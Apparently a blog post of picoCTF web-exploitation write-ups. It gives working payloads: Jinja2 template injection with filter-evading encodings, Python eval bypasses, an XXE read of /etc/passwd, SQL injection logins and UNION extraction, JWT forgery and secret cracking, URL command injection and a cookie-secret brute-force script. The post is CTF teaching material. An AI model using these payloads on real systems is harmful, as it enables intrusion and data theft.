---
layout: post
title: "Medium Challenges"
subtitle: "Burppp.."
date: 2025-05-23 06:11:00 +0530
author: s0c41dgvns 
categories: [PicoCTF, WebExploitation]
tags: [
  web exploitation,
  picoCTF,
  Web challenges,
]
---

# PicoCTF 2025

## Pachinko

### Description

> History has failed us, but no matter.[Server source](https://challenge-files.picoctf.net/c_activist_birds/7eac27979c12e4bd449f03e40a8492044221b7d2a96ac85f1150e30983c56eac/server.tar.gz)There are two flags in this challenge. Submit flag one here, and flag two in **Pachinko Revisited**.[Server source](https://challenge-files.picoctf.net/c_activist_birds/7eac27979c12e4bd449f03e40a8492044221b7d2a96ac85f1150e30983c56eac/server.tar.gz)
> 
> 
> Additional details will be available after launching your challenge instance.
> 

### Solution

- You will be able to see a NAND gate simulator when you open the website.
- Also, application’s source is given.
- Keep playing with the simulator here and there and submit that.
- While submitting that, open the network tab and click the submit button.
- keep on submitting it for some n number of times, you will see the flag.

May be this is due to memeory management, but this works.

Well, i tried without even connecting the nodes

![image.png](/assets/images/picoMediumimages/image.png)

---

## SSTI

### Description

> I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)
Additional details will be available after launching your challenge instance.
> 

### Solution

- This is very much similar to SSTI1 that we have solved already.
- Even this challenge is working on JInja2 but just an improvement in sanitization
- The hint stated that they have blacklisted some characters. So, find a payload that works with jinja2 and also excludes the characters that are blacklisted, just do hit and trail

```jsx
{{ request
    |attr('application')
    |attr('\x5f\x5fglobals\x5f\x5f')
    |attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')
    |attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')
    |attr('popen')('cat flag')
    |attr('read')()
}}

```

Why did this work?

This payload is quite similar to what we have used in SSTI1

```jsx
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

### 🔓 Why it works (bypass details):

- **Filters block `__globals__`, `__import__`, etc.** → But you **bypassed** using:
    - `attr()` instead of dot access
    - hex-encoded `__` → `\x5f\x5f` (which isn't detected by basic filters)
- **All this stays inside `{{ ... }}`** so template syntax is never broken.

---

## 3v@l

### Description

> ABC Bank's website has a loan calculator to help its clients calculate the amount they pay if they take a loan from the bank. Unfortunately, they are using an `eval` function to calculate the loan. Bypassing this will give you Remote Code Execution (RCE). Can you exploit the bank's calculator and read the flag?
> 
> 
> Additional details will be available after launching your challenge instance.
> 

### Solution

- On opening the site, there is a calculator that works fine.
- i have gone through the source code and there are some comments.

```html
<!--
    TODO
    ------------
    Secure python_flask eval execution by 
        1.blocking malcious keyword like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind
        2.Implementing regex: r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'
-->
```

- These give us a huge insight on what we have to bypass without testing out different keywords

Payload

```python
getattr(__import__(‘subprocess’), ‘check_output’)([chr(99)+chr(97)+chr(116),chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)])
```

- this payload is equal to
- **import**(‘subprocess’)
- using getattr instead for __import__(subprocess).check_output()
- Obfuscating the main cat flag.txt with chr()

with this, check_output() command executes the obfuscated “cat flag.txt”.

We will get the flag by entering this payload.

<aside>
⛳

picoCTF{D0nt_Use_Unsecure_f@nctions3ce5e79c}

</aside>

---

## WebSockFish

### Description

> Can you win in a convincing manner against this chess bot? He won't go easy on you!
> 

### Solution

- There’s code to understand the logic. This ws traffic is sending some values and the fish is replying with some text, like **I'm just a fish, but I know a thing or two about chess**
- With each move, we are having some increasingly going numbers which later shows “deep under in water” like this.
- So, what if we trick the fish that without sending some positive numbers as it is thinking more positive means it has the odds to win, we send negative numbers
- So, we can make a new websocket connection and send negative numbers making the fish to think it is loosing the game.

```jsx
//code given in the app logic
 var ws_address = "ws://" + location.hostname + ":" + location.port + "/ws/";
 const ws2 = new WebSocket(ws_address);

ws2.send(-1)
```

- This worked, now we shall decrease the number.

```jsx
ws2.send(-369)
ws2.send(-369369)
ws2.send(--369234289)
```

Sooner, we will get the flag as a msg

![image.png](/assets/images/picoMediumimages/image%201.png)

<aside>
⛳

picoCTF{c1i3nt_s1d3_w3b_s0ck3t5_46c33d0c}

</aside>

---

## SOAP

### Description

> The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?
> 
> 
> [Web Portal](http://saturn.picoctf.net:56367/)
> 

### Understanding

- Basically, any WebApp when there is a feature of querying the data, it uses some techniques like SQL queries, JSON, XML and NoSQL queries etc.
- The title itself hints us that It’s using XML for some features(those that retrieve the data on user preference like check stock feature in E-commerce).
- So, putting it in mind, let’s proceed with XML External Injection.
- There is a feature called details which displays the data according to the Source code of WebApp.

### Solution

- Now, Intercept that req in Burpsuite, you will be able to see XML query in the request.
    
    ```xml
    POST /data HTTP/1.1
    Host: saturn.picoctf.net:56367
    Content-Length: 61
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
    Content-Type: application/xml
    Accept: */*
    Sec-GPC: 1
    Accept-Language: en-US,en;q=0.9
    Origin: http://saturn.picoctf.net:56367
    Referer: http://saturn.picoctf.net:56367/
    Accept-Encoding: gzip, deflate, br
    Connection: close
    
    <?xml version="1.0" encoding="UTF-8"?><data><ID>1</ID></data>
    ```
    
- Now, inject this in XML and make the request look like this(Use ***repeater*** tab)
    
    ```xml
    POST /data HTTP/1.1
    Host: saturn.picoctf.net:56367
    Content-Length: 132
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
    Content-Type: application/xml
    Accept: */*
    Sec-GPC: 1
    Accept-Language: en-US,en;q=0.9
    Origin: http://saturn.picoctf.net:56367
    Referer: http://saturn.picoctf.net:56367/
    Accept-Encoding: gzip, deflate, br
    Connection: close
    
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <data><ID>
    &xxe;</ID></data>
    ```
    
- Intercept the response of this request, you will see the flag in the response itself. ^^

<aside>
⛳

picoCTF{XML_3xtern@l_3nt1t1ty_0dcf926e}

</aside>

---

## MatchTheRegex

### Description

> How about trying to match a regular expressionThe website is running
> 
> 
> [here](http://saturn.picoctf.net:58620/).
> 

### Understanding

- On opening the site, we are given with a input box and there is nothing much.
- Entered random gibberish and saw the output. Later, inspected the Source code.
- There’s a Function

```jsx
function send_request() {
		let val = document.getElementById("name").value;
		// ^p.....F!?
		fetch(`/flag?input=${val}`)
			.then(res => res.text())
			.then(res => {
				const res_json = JSON.parse(res);
				alert(res_json.flag)
				return false;
			})
		return false;
	}
```

- There’s a commented thing, what could that be? On brainstorming the possibility on these constraints
    - Something that starts with p → pico (General flag format of picoCTF’s)
    - Flag ends with F, typical picoCTF flag ends with `}`

### Solution

- Enter `picoCTF` in the box to see the flag.

---

## JavaCode Analysis

### Description

> BookShelf Pico, my premium online book-reading service.
I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book!
Additional details will be available after launching your challenge instance.
> 
> 
> BookShelf Pico, my premium online book-reading service.I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book!Here are the credentials to get you started:
> 
> - Username: "user"
> - Password: "user"
> 
> Source code can be downloaded[here](https://artifacts.picoctf.net/c/482/bookshelf-pico.zip).
> 
> Website can be accessed[here!](http://saturn.picoctf.net:52611/).
> 

### Understanding

- Basically, this is a JAVA backed webapp, we are given with three pdf’s with basic credentials `user:user` .
- Login with them and try to open the flag.pdf, it says you need to be admin to open this.
- Also, one of our hint say’s

<aside>
🧩

Maybe try to find the JWT Signing Key ("secret key") in the source code? Maybe it's hardcoded somewhere? Or maybe try to crack it?

</aside>

- That means, there is something to do with JavaWebToken(JWT), so on opening the inspector, we can confirm that our cookie is JWT token.
- Now, when i copied that token and put it in JWT decoder, it gave

```json
{
  "role": "Free",
  "iss": "bookshelf",
  "exp": 1747983077,
  "iat": 1747378277,
  "userId": 1,
  "email": "user"
}
```

```json
{
  "typ": "JWT",
  "alg": "HS256"
}
```

- Typically, in this case, we can think of doing something with role, and other data.
- So, I have gone through SourceCode and found files related to JWT and authorization.
- There, i have seen a hardcoded secret key `1234` .
- Now, i have searched for role and email keywords and picked those exact values of Admin’s.

### Solution

- Put them in the JWT decoder and also, try incrementing the userId until you get the result.
- Luckily, i have got the Admin access in the second userID itself.
- Now, paste both new JWT and also payload in the cookie section of website and refresh it.
- You will now be logged in as Admin.
- See the flag from flag.pdf, it’s done.

![image.png](/assets/images/picoMediumimages/image%202.png)

---

## More SQLi

### Description

> Can you find the flag on this website.Try to find the flag
> 
> 
> [here](http://saturn.picoctf.net:65335/).
> 

### Understanding

- The Title itself is saying that SQL, so let’s try sql on the login page.
- First, enter random credentials along with let’s enter our dangerous SQLi prone chracter `‘`
- It resulted the query that is being implemented on the backend.

```json
admin':admin'
```

```json
username: admin'
password: admin'
SQL query: SELECT id FROM users WHERE password = 'admin'' AND username = 'admin''
```

- Now, let’s use simple sqli to login.

```json
1' or 1=1--
```

 

- Yay!, we logged in, but the task starts from here.
- There is a table and a search field that is returning what we ask for.
- So, let’s try finding how many columns are there using Union Based Injections.

```sql
123' UNION SELECT null, null, null;--
```

- I have found out there are 3 columns.
- Now, let’s find what version is the database

```sql
123' UNION SELECT null, sqlite_version(), null;--
```

- Now, we shall find what tables are there in the DB, this below query is what i Used

```sql
123' UNION SELECT name, sql, null from sqlite_master;--
```

| City | Address | Phone |
| --- | --- | --- |
| hints | CREATE TABLE hints (id INTEGER NOT NULL PRIMARY KEY, info TEXT) |  |
| more_table | CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, **flag** TEXT) |  |
| offices | CREATE TABLE offices (id INTEGER NOT NULL PRIMARY KEY, city TEXT, address TEXT, phone TEXT) |  |
| sqlite_autoindex_users_1 |  |  |
| users | CREATE TABLE users (name TEXT NOT NULL PRIMARY KEY, password TEXT, id INTEGER) |  |
- In the table, we can see flag as a column, let’s pull that out using our Query.

```sql
123' UNION SELECT flag, null, null from more_table;--
```

| City | Address | Phone |
| --- | --- | --- |
| If you are here, you must have seen it |  |  |
| picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37} |  |  |

<aside>
⛳

picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37}

---

</aside>

---

## Readme

### Description

> 
> 

### Thought process of mine

- Try opening the site and login with the credentials
- You will see a search field after the login, now try to search for some keywords like flag, pico etc
- You will see nothing but a ? pop in the URL, I’ve tried for adding some param’s like cmd etc for command execution but it didn’t work.
- So, I have gone through source code and robots.txt(Which I didn’t find).
- So, now let’s make use of Hints. They mentioned Look for “Any Redirections”.
- So, this time I opened the burpsuite and intercepted the login page and forwarded one req after another.
- Then, in the header, we can see some random text is popping login page is redirecting.

```
POST /login HTTP/1.1
Host: saturn.picoctf.net:50879
Content-Length: 30
Cache-Control: max-age=0
Origin: http://saturn.picoctf.net:50879
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.9
Referer: http://saturn.picoctf.net:50879/
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=kfnuk6c72a78ua7nvnr83qi2ls
Connection: close

	username=test&password=test%21
```

```
GET /next-page/id=**cGljb0NURntwcm94aWVzX2Fs** HTTP/1.1
Host: saturn.picoctf.net:50879
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.9
Referer: http://saturn.picoctf.net:50879/
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=kfnuk6c72a78ua7nvnr83qi2ls
Connection: close

```

```
GET /next-page/id=**bF90aGVfd2F5XzAxZTc0OGRifQ==** HTTP/1.1
Host: saturn.picoctf.net:50879
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.9
Referer: http://saturn.picoctf.net:50879/next-page/id=cGljb0NURntwcm94aWVzX2Fs
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=kfnuk6c72a78ua7nvnr83qi2ls
If-None-Match: W/"e5-LTjUGH/wFj4zC3orEfBV+FaVEVs"
Connection: close

```

- This is our flag encoded in base64, combine both the parts

```bash
cGljb0NURntwcm94aWVzX2FsbF90aGVfd2F5XzAxZTc0OGRifQ==
```

- Decode it and submit and consider challenge completed.

<aside>
⛳

picoCTF{proxies_all_the_way_01e748db}

</aside>

---

## Secrets

### Description

> We have several pages hidden. Can you find the one with the flag?
> 

### My thought process

- The site is a collection of static webpages. There are three pages that are being accessible.
- But, the challenge states there are more pages that are hidden, find the flag.
- Now the hunt for the other pages.
- Typical step, looked out for anything on the source code and all along with robots.txt, but i could find none.
- Now, I have opened our Inspect tab and looked on to sources tab, In there i have seen a folder named secret.
    - I visited that page and it shows positive signs to the flag. `picoserver:port/secret`
- Now, again we can see another folder pop in there all of a sudden. Do this iteratively until you get the flag.
    - `picoserver:port/secret/hidden/supersecret/`

<aside>
⛳ picoCTF{succ3ss_@h3n1c@10n_51b260fe}

</aside>

---

## SQL Direct

### Description

> 
> 

### Thought process

- Just gone through the chall description and googled some basic queries that we can use for a POSTGRES sql database.
- List all available tables>find appropriate>select * from appropriate_table

```bash
saiyash_006-picoctf@webshell:~$ psql -h saturn.picoctf.net -p 58376 -U postgres pico
Password for user postgres: 
psql (14.17 (Ubuntu 14.17-0ubuntu0.22.04.1), server 15.2 (Debian 15.2-1.pgdg110+1))
WARNING: psql major version 14, server major version 15.
         Some psql features might not work.
Type "help" for help.

pico=# help
You are using psql, the command-line interface to PostgreSQL.
Type:  \copyright for distribution terms
       \h for help with SQL commands
       \? for help with psql commands
       \g or terminate with semicolon to execute query
       \q to quit
pico=# \dt           
         List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | flags | table | postgres
(1 row)

pico=# ^C
pico=# \d flags
                        Table "public.flags"
  Column   |          Type          | Collation | Nullable | Default 
-----------+------------------------+-----------+----------+---------
 id        | integer                |           | not null | 
 firstname | character varying(255) |           |          | 
 lastname  | character varying(255) |           |          | 
 address   | character varying(255) |           |          | 
Indexes:
    "flags_pkey" PRIMARY KEY, btree (id)

pico=# select * from flags;
 id | firstname | lastname  |                address                 
----+-----------+-----------+----------------------------------------
  1 | Luke      | Skywalker | picoCTF{L3arN_S0m3_5qL_t0d4Y_21c94904}
  2 | Leia      | Organa    | Alderaan
  3 | Han       | Solo      | Corellia
(3 rows)

```

<aside>
⛳ picoCTF{L3arN_S0m3_5qL_t0d4Y_21c94904}

</aside>

---

## SQLiLite

### Description

> Can you login to the website?
> 

### Thought Process

- The site contains a login page, taking the hint of chall title, we can try SQLi in here.

Used `admin:admin`  to see the behaviour.

- Later, we put the payload and yeah, we logged in

```sql
username: admin' OR 1=1--
password: admin
SQL query: SELECT * FROM users WHERE name='admin' OR 1=1--' AND password='admin'
```

- They have hid the flag in plainsight, they say, so see source code in the firstplace.

```html

<pre>username: admin&#039; OR 1=1--
password: admin
SQL query: SELECT * FROM users WHERE name=&#039;admin&#039; OR 1=1--&#039; AND password=&#039;admin&#039;
</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}</p>
```

<aside>
⛳ picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}

</aside>

---

## Search Source

## Description

> The developer of this website mistakenly left an important artifact in the website source, can you find it?
Additional details will be available after launching your challenge instance.
> 

### Thought Process

- I have seen the source code of the page using both ctrl+u and inspect tool too.
- But unable to find anywhere, also did some exploration with the contact form too, but it’s of no use.
- Then, I have seen the hint and mirrored it using `HTTRACK` tool that is available on kali.
- Spawned it instantly and did `httrack http://saturn.picoctf.net:53049/` .
- Then, I made use of grep tool to find the flag.

```bash
┌──(kali㉿kali)-[~/temp/temp]
└─$ httrack http://saturn.picoctf.net:53049/
Mirror launched on Fri, 16 May 2025 13:11:04 by HTTrack Website Copier/3.49-6 [XR&CO'2014]
mirroring http://saturn.picoctf.net:53049/ with the wizard help..
* saturn.picoctf.net:53049/js/jquery.mCustomScrollbar.concat.min.js (45479 bytesDone.: saturn.picoctf.net:53049/images/fevicon.png (153 bytes) - 404
Thanks for using HTTrack!
                                                                                
┌──(kali㉿kali)-[~/temp/temp]
└─$ ls
backblue.gif  hts-cache    index.html
fade.gif      hts-log.txt  saturn.picoctf.net_53049
                                                                                
┌──(kali㉿kali)-[~/temp/temp]
└─$ grep -r "picoCTF"                              
saturn.picoctf.net_53049/css/style.css:/** banner_main 
**picoCTF{1nsp3ti0n_0f_w3bpag3s_ec95fa49}** **/

```

---

## Roboto Sans

### Description

> The flag is somewhere on this web application not necessarily on the website. Find it.
Additional details will be available after launching your challenge instance
> 

### Thought Process

- Keeping the description and Title in the mind, I looked for files that i can get.
- Soon, I have landed on the robots.txt and there is a base64 encoded string.
- On decoding it, it gave me a path.
    - I have gone to that path, there I’ve found the flag.

---

## PowerCookie

### Description

> Can you get the flag?
Additional details will be available after launching your challenge instance.
> 

### Solution

- On opening the site, there is a button, I immediately looked into the source code.
- It there is a js file, opened it and saw, there is a cookie isAdmin=0
- There, we can understand we are on the right track, the title and the cookie that we found.
- Let’s make this isAdmin=1 in the browser cookie, so we can get the admin privileges.
- Soon, we will get the flag on refreshing the site.

I think, this challenge shouldn’t be on Medium level :)

---

## JAuth

### Description

> Most web application developers use third party components without testing their security. Some of the past affected companies are:
> 
> - Equifax (a US credit bureau organization) - breach due to unpatched Apache Struts web framework CVE-2017-5638
> - Mossack Fonesca (Panama Papers law firm) breach - unpatched version of Drupal CMS used
> - VerticalScope (internet media company) - outdated version of vBulletin forum software used
> 
> Can you identify the components and exploit the vulnerable one?
> 
> Additional details will be available after launching your challenge instance.
> 

### Solution

- Initially, It didn’t make sense to me about the title, later, from the cookie, i got to know.
- Now, I’ve put the token in [this](https://token.dev).

> Format of JWT token is generally, HEADER.Payload.signature if we use some algorithm
> 

![image.png](/assets/images/picoMediumimages/image%203.png)

- It  uses HS256 algorithm to hash this, but this is a Symmetric key, we can crack this signature if it is weak.
- But, first let’s try setting the alg to none and role to admin and then try to put in cookie place.

> Since, we have set the alg to none, the signature part will be gone and to maintain the minimum of two (.)
> 
- I have done this because it involves no tools and typical step that I would do.
- Bang, it worked without even using the tools.

![Added a period at the end after changing alg → none and role→admin.](image%204.png)

Added a period at the end after changing alg → none and role→admin.

---

## Caas

### Description

> Now presenting
> 
> 
> [cowsay as a service](https://caas.mars.picoctf.net/)
> 

### Thought process

- They have given a index.js file, the contents of it are like

```bash
const express = require('express');
const app = express();
const { exec } = require('child_process');

app.use(express.static('public'));

app.get('/cowsay/:message', (req, res) => {
  exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => {
    if (error) return res.status(500).end();
    res.type('txt').send(stdout).end();
  });
});

app.listen(3000, () => {
  console.log('listening');
});

```

- Here, exec command is being used to show the output. This is a malicious point where hackers try to inject commands and try command Injection.
- So, i have tried doing `[https://caas.mars.picoctf.net/cowsay/{message};ls](https://caas.mars.picoctf.net/cowsay/%7Bmessage%7D;ls)`

```
 ___________
< {message} >
 -----------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
Dockerfile
**falg.txt**
index.js
node_modules
package.json
public
yarn.lock

```

- Since, we got something that sounded like flag, we will cat that

[caas.mars.picoctf.net](https://caas.mars.picoctf.net/cowsay/%7Bmessage%7D;ls;cat%20falg.txt)

```
 ___________
< {message} >
 -----------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
Dockerfile
falg.txt
index.js
node_modules
package.json
public
yarn.lock
**picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}**
```

---

## Most Cookies

### Description

> Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/e99686c2e3e6cdd9e355f1d10c9d80d6/server.py) [http://mercury.picoctf.net:53700/](http://mercury.picoctf.net:53700/)
> 

### Thought process

- Firstly, the title itself pulled me to check the cookies after login.
- That is a JWT token, if it is a JWT, then we must have gotten the signing key used to make that token from the sever.py
- Yes, we did get a list of secret keys that are being used. Now, it’s time to bruteforce the keys and see what is the secret key is being used.
- Later, i even made a own JWT with header, `{'very_auth': 'admin'}`  and sent requests to fetch the flag.
- Ofcourse, I’ve got this automation script from chatGPT.

```python
import subprocess
import requests

def sign_cookie_with_secrets(secrets, cookie_data="{'very_auth': 'admin'}"):

    signed_cookies = {}

    for secret in secrets:
        try:
            # Build the command with the full path to flask-unsign.exe
            command = [
                r'C:\Users\socal\AppData\Roaming\Python\Python312\Scripts\flask-unsign.exe',
                '--sign',
                '--cookie', cookie_data,
                '--secret', secret
            ]

            # Run the command and capture the output
            result = subprocess.run(command, capture_output=True, text=True, check=True)

            # Store the signed cookie
            signed_cookies[secret] = result.stdout.strip()
        except subprocess.CalledProcessError as e:
            # Handle errors (e.g., invalid secret or command failure)
            signed_cookies[secret] = f"Error: {e.stderr.strip()}"
    print(signed_cookies)
    return signed_cookies

def check_cookies_for_flag(signed_cookies):
    target_url = 'http://mercury.picoctf.net:53700/display'

    for secret, signed_cookie in signed_cookies.items():
        try:
            # Send a GET request with the signed cookie
            cookies = {'session': signed_cookie}
            response = requests.get(target_url, cookies=cookies,allow_redirects=False)
            if response.status_code==302:
                continue

            # Check if the response contains 'picoCTF'
            if 'picoCTF' in response.text:
                print(f"Secret: {secret}\nSigned Cookie: {signed_cookie}\nResponse Text: {response.text}\n")
                exit
        except Exception as e:
            print(f"Error with secret '{secret}': {e}")

# Example usage
if __name__ == "__main__":
    # List of secrets to try
    secrets= ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

    # Sign the cookie with each secret
    signed_cookies = sign_cookie_with_secrets(secrets)

    # Check each signed cookie for the flag
    check_cookies_for_flag(signed_cookies)
```

- You will get to see the HTTP response that consists picoCTF, submit it and done!

---

## JaWT ScratchPad

### Description

> Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/58210/` or http://jupiter.challenges.picoctf.org:58210
> 

### Solution

- The description suggests us to escalate into admin as it contains the flag.
- They have given a cookie when we signed in.
- The JWT token is signed with HMAC-SHA256 with is a hash that can be cracked, let’s try bruteforcing it with our very known **Rockyou.txt**

```bash
┌──(kali㉿kali)-[~/temp1]
└─$ cat jwt_token.txt 
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiaGkifQ.Xl1EkkX5mL4x4HDoLySJNj9GVBflZtlmY3Qdene3S-g

┌──(kali㉿kali)-[~/temp1]
└─$ john jwt_token.txt --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 AVX 4x])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
***ilovepico***        (?)     
1g 0:00:00:03 DONE (2025-05-17 01:43) 0.3267g/s 2417Kp/s 2417Kc/s 2417KC/s iloveskitty..ilovemymother@
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

- Now, open our [JWT.io](http://JWT.io) and enter the secret key `ilovepico`  and also change the user name to admin in the payload.
- Put the cookie and submit, you will get the flag.

<aside>
⛳

**picoCTF{jawt_was_just_what_you_thought_44c752f5}**

</aside>

---

## it’s my Birthday

### Description

> I sent out 2 invitations to all of my friends for my birthday! I'll know if they get stolen because the two invites look similar, and they even have the same md5 hash, but they are slightly different! You wouldn't believe how long it took me to find a collision. Anyway, see if you're invited by submitting 2 PDFs to my website.
> 
> 
> [http://mercury.picoctf.net:11590/](http://mercury.picoctf.net:11590/)
> 

### Solution

- The description is saying about collision and MD5 at the same time, so I know there are pdf/files with md5 hash as same(previous knowledge).
- Then, downloaded them, follow this [guide](https://www.mscs.dal.ca/~selinger/md5collision/)
- On uploading, you will be able to see the passwored.

<aside>
⛳

FLAG: **picoCTF{c0ngr4ts_u_r_1nv1t3d_3d3e4c57}**

</aside>

---

## **Irish-Name-Repo 1**

### Description

> There is a website running at `https://jupiter.challenges.picoctf.org/problem/50009/` ([link](https://jupiter.challenges.picoctf.org/problem/50009/)) or http://jupiter.challenges.picoctf.org:50009. Do you think you can log us in? Try to see if you can login!

There is a website running at `https://jupiter.challenges.picoctf.org/problem/50009/` ([link](https://jupiter.challenges.picoctf.org/problem/50009/)) or http://jupiter.challenges.picoctf.org:50009. Do you think you can log us in? Try to see if you can login!
> 

### Solution

- The main page content didn’t seem any useful, tried those people’s names one by one, still no use.
- There is admin login page.
- LOGIN PAGE, let’s try SQL Injection and that too basic login payload `admin‘ OR 1=1—`
- Logged in and flag in plainsight.

---

## **Irish-Name-Repo 2**

### Description

> There is a website running at
> 
> 
> ([link](https://jupiter.challenges.picoctf.org/problem/53751/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:53751
> 

### Solution

- This time, unlike Irish-name-repo 1, the SQLi is being filtered out.
- So, let’s try modifying it to `admin ‘—`
- This worked and flag appeared from thin air.
- Done and Dusted.

---

## **Irish-Name-Repo 3**

### Description

> There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/29132/` ([link](https://jupiter.challenges.picoctf.org/problem/29132/)) or http://jupiter.challenges.picoctf.org:29132. Try to see if you can login as admin!
> 

### Solution

- Enter the sql injection now in the password field, we can see nothing is being returned.
- Let’s have a look at source code and there is a hidden debug field, we can change it’s value to be one and try the same payload again.
- This time, the sql query is being reflected in the output.

```html
password: ' or 1=1--
SQL query: SELECT * FROM admin where password = '' be 1=1--'
```

- That means if you observe, our payload is being modified, OR → BE.
- Let’s try the reverse that is trying with BE, `‘ BE 1=1—` .
- This worked and gave me the flag.

---

## Web Gaunlet 1

### Description

> Can you beat the filters? Log in as admin
> 
> 
> [http://jupiter.challenges.picoctf.org:41560/](http://jupiter.challenges.picoctf.org:41560/)
> 
> [http://jupiter.challenges.picoctf.org:41560/filter.php](http://jupiter.challenges.picoctf.org:41560/filter.php)
> 

### Solution

- We have to bypass the login page via SQLi for a 5 rounds. What are being filtered from the inputs are given in filter.php
- Now, i have got the last payload, just use it. It takes you to the last level.

```sql
a'||'dmin';
```

---

## Web Gaunlet 2

### Description

> This website looks familiar... Log in as admin Site:
> 
> 
> [http://mercury.picoctf.net:57359/](http://mercury.picoctf.net:57359/)
> 
> Filter:
> 
> [http://mercury.picoctf.net:57359/filter.php](http://mercury.picoctf.net:57359/filter.php)
> 

### Solution

- In the filter list, we can see `Filters: or and true false union like = > < ; -- /* */ admin`
- Since, admin is being filtered, we can use our concatetation operation ‘||’ that is a’||’dmin
- On entering this, it is not allowing to login, that means, we need to provide something that makes the password field true.
- so, let’s try `6’ is not ‘9` and click enter this time. With this combo, our flag is waiting in filter.php, go grab it.